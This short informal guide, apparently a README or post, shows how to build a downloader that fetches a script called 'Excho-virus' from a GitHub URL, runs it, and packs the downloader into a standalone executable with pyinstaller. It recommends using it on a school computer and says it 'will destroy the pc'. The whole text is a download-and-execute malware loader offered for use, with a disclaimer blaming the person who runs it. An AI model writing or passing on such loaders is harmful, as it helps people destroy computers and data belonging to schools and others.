best to use on computer of school

first download pyinstaller

if not then

pip install pyinstaller

 then

 import urllib.request
import os

def download_script(url, filename):
    try:
        urllib.request.urlretrieve(url, filename)
    except Exception as e:
        print("Error downloading script:", e)

def run_script(filename):
    try:
        os.system("python " + filename)
    except Exception as e:
        print("Error running script:", e)

def main():
    github_url = "https://raw.githubusercontent.com/Voidraidlo/Excho-virus/main/Excho.py"
    filename = "Excho.py"
    download_script(github_url, filename)
    run_script(filename)

if __name__ == "__main__":
    main()


pyinstaller --onefile excho_downloader.py



this will destroy the pc, if you are angry at me remember you are the one who 
wanna do it. 
